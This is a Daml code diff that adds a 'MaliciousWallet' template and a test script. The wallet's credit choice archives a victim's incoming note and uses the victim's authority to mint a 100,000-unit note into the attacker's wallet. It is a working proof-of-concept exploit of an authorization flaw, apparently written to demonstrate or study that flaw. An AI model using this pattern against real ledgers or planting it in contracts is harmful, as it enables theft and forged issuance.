@@ -1,0 +1,78 @@
+module MaliciousWallet where
+
+import Wallet
+import Note
+
+import MultiWallet
+import Daml.Script
+import DA.Map (Map)
+import qualified DA.Map as Map
+import DA.Set (Set)
+import qualified DA.Set as Set
+
+template MaliciousWallet
+  with
+    owner: Party
+    innerWallet: WalletId
+    amount: Int
+    target: Party
+  where
+    signatory owner
+    observer target
+
+    implements Wallet where
+      let getOwner = owner
+
+      let credit_ = \addedNoteId -> do
+          note <- fetch addedNoteId
+          _ <- archive addedNoteId
+          biggerNote <- create Note with amount = amount, issuer = note.issuer, owner = note.issuer
+          exercise innerWallet Credit with from = note.issuer, noteId = biggerNote
+
+      let withdraw_ = \issuer -> error "Not Implemeted"
+
+
+test: Script ()
+test =
+  do
+
+    fed <- allocatePartyWithHint "Federal Reserve" (PartyIdHint "Federal Reserve")
+    sg <- allocatePartyWithHint "Societe Geniale" (PartyIdHint "Societe Geniale")
+
+    mallory <- allocatePartyWithHint "Mallory" (PartyIdHint "Mallory")
+
+    noteFed <- submitMulti [fed, mallory] []
+      do
+        createCmd Note with issuer = fed, owner = mallory, amount = 100
+
+    noteSg1 <- submitMulti [sg] []
+      do
+        createCmd Note with issuer = sg, owner = sg, amount = 1
+
+    noteSg2 <- submitMulti [sg] []
+      do
+        createCmd Note with issuer = sg, owner = sg, amount = 1
+
+    malloryWallet_ <- submit mallory
+      do
+        createCmd MultiWallet with owner = mallory, notes = Map.empty, observers = Set.fromList [sg]
+    let malloryWallet = toWalletContractId malloryWallet_
+
+    malloryWallet <- submit mallory
+      do
+        exerciseCmd malloryWallet Credit with from = mallory, noteId = noteFed
+
+    malloryWallet <- submit sg
+      do
+        exerciseCmd malloryWallet Credit with from = sg, noteId = noteSg1
+
+    malliciousWallet_ <- submit mallory
+      do
+        createCmd MaliciousWallet with owner = mallory, innerWallet = malloryWallet, amount = 100000, target = sg
+    let malliciousWallet = toWalletContractId malliciousWallet_
+
+    malliciousWallet <- submit sg
+       do
+         exerciseCmd malliciousWallet Credit with from = sg, noteId = noteSg2
+
+    pure ()
